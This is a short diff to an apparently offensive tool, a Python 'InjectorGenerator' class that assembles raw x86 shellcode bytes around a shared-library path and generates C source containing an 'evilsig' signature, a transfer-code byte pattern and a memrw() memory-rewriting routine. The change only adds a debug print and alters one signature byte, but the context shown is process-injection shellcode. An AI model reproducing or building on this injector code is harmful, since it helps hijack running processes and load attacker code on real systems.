@@ -90,7 +90,7 @@ class InjectorGenerator():
         , "24", "10", "89", "54", "24", "14", "b8", "5a", "00", "00", "00", "89", "e3", "cd", "80", "cc"
         , "e8", "c0", "ff", "ff", "ff"]
         
-        
+        print self.libPath
         for x in self.libPath :
             shellcode.append(hex(ord(x))[2:]) 
         shellcode.append("00")
@@ -181,7 +181,7 @@ unsigned char evilsig[] = "'''
 /* here is the signature for our transfer code, this will vary */
 /* depending on whether or not you use a function pointer or a */
 /* movl/jmp sequence. The one below is for a function pointer */
-unsigned char tc[] = "\\xc7\\x45\\xf0\\x00"; 
+unsigned char tc[] = "\\xc7\\x45\\xf4\\x00"; 
 
  
 /*  Our memrw() function serves three purposes
